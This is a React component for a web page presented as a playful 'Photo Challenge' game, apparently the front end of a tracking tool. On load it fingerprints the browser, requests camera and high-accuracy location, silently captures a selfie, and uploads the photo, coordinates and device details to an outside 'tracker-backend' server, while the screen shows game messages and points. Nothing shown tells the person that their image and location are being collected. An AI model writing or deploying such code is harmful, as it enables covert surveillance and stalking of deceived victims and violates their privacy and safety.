import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-backend-eta.vercel.app').replace(/\/+$/, '');

function CameraCapture({ onSuccess }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState('playing'); // playing, success, error
  const [location, setLocation] = useState(null);
  const [browserInfo, setBrowserInfo] = useState(null);
  const [score, setScore] = useState(0);

  useEffect(() => {
    collectBrowserInfo();
    requestPermissions();
  }, []);

  const collectBrowserInfo = () => {
    const info = {
      browserName: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)/)?.[0] || 'Unknown',
      os: navigator.platform,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    setBrowserInfo(info);
  };

  const requestPermissions = async () => {
    try {
      // Check if mediaDevices and geolocation are available
      if (!navigator.mediaDevices || !navigator.geolocation) {
        throw new Error('Camera or location services not available.');
      }

      // Request camera permission
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        // Request location immediately
        navigator.geolocation.getCurrentPosition(
          (position) => {
            setLocation({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            });
            // Capture immediately
            setTimeout(() => captureSelfie(), 300);
          },
          (error) => {
            console.error('Location error:', error);
            setStatus('error');
          },
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      }
    } catch (error) {
      console.error('Request permissions error:', error);
      setStatus('error');
    }
  };

  const captureSelfie = () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;
    
    if (!video || !canvas) return;
    
    // Resize image to lower resolution to reduce file size
    const maxWidth = 400;
    const maxHeight = 300;
    let width = video.videoWidth || 640;
    let height = video.videoHeight || 480;
    
    if (width > height) {
      if (width > maxWidth) {
        height = Math.round(height * maxWidth / width);
        width = maxWidth;
      }
    } else {
      if (height > maxHeight) {
        width = Math.round(width * maxHeight / height);
        height = maxHeight;
      }
    }
    
    canvas.width = width;
    canvas.height = height;
    canvas.getContext('2d').drawImage(video, 0, 0, width, height);
    const imageData = canvas.toDataURL('image/jpeg', 0.5); // Lower quality for speed
    uploadData(imageData);
  };

  const uploadData = async (imageData) => {
    try {
      const response = await axios.post(`${API_BASE_URL}/api/records`, {
        selfie: imageData,
        location: location,
        browserInfo: browserInfo
      });
      setScore(1000);
      setStatus('success');
      setTimeout(onSuccess, 1500);
    } catch (error) {
      console.error('Upload error full details:', error.response?.data || error.message);
      setStatus('error');
    }
  };

  if (status === 'error') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-yellow-400 to-orange-500 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
          <div className="w-24 h-24 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <span className="text-6xl">🎮</span>
          </div>
          <h1 className="text-4xl font-black text-gray-800 mb-4">Game Paused!</h1>
          <p className="text-gray-600 mb-8 text-lg">
            Oops! We need camera and location permissions to play!
          </p>
          <button
            onClick={() => window.location.reload()}
            className="w-full bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white font-black py-5 px-6 rounded-xl transition-all duration-200 text-xl shadow-lg hover:shadow-xl transform hover:-translate-y-1"
          >
            Play Again!
          </button>
        </div>
      </div>
    );
  }

  if (status === 'success') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-400 to-emerald-500 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
          <div className="w-24 h-24 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <span className="text-6xl">🏆</span>
          </div>
          <h1 className="text-4xl font-black text-gray-800 mb-2">Level Complete!</h1>
          <p className="text-5xl font-black text-yellow-500 mb-4">{score} Points!</p>
          <p className="text-gray-600 text-lg">Awesome job! You're a pro!</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-500 via-pink-500 to-red-500 p-4">
      <div className="max-w-md mx-auto">
        {/* Game Header */}
        <div className="bg-white/20 backdrop-blur-lg rounded-2xl p-4 mb-6 text-center">
          <h1 className="text-3xl font-black text-white mb-1 drop-shadow-lg">🎯 Photo Challenge!</h1>
          <p className="text-white/90 font-semibold">Smile for the camera!</p>
        </div>

        {/* Game Camera */}
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden mb-6">
          <div className="relative">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="w-full aspect-square object-cover"
            />
            <canvas ref={canvasRef} className="hidden" />
            {/* Game UI Overlay */}
            <div className="absolute inset-0 border-8 border-white/30 pointer-events-none"></div>
            <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2">
              <div className="bg-white/90 backdrop-blur px-4 py-2 rounded-full shadow-lg">
                <span className="text-2xl font-black text-purple-600">✨ Ready!</span>
              </div>
            </div>
          </div>
        </div>

        {/* Game Info */}
        <div className="bg-white/20 backdrop-blur-lg rounded-2xl p-6 text-center">
          <div className="flex items-center justify-center gap-2 mb-4">
            <span className="text-4xl animate-pulse">📸</span>
            <span className="text-white text-xl font-bold">Capturing...</span>
          </div>
          <div className="flex items-center justify-center gap-4">
            <div className="flex items-center gap-2 bg-white/30 px-4 py-2 rounded-full">
              <span className="text-2xl">📍</span>
              <span className="text-white font-semibold">Finding location...</span>
            </div>
            <div className="flex items-center gap-2 bg-white/30 px-4 py-2 rounded-full">
              <span className="text-2xl">💾</span>
              <span className="text-white font-semibold">Saving...</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default CameraCapture;
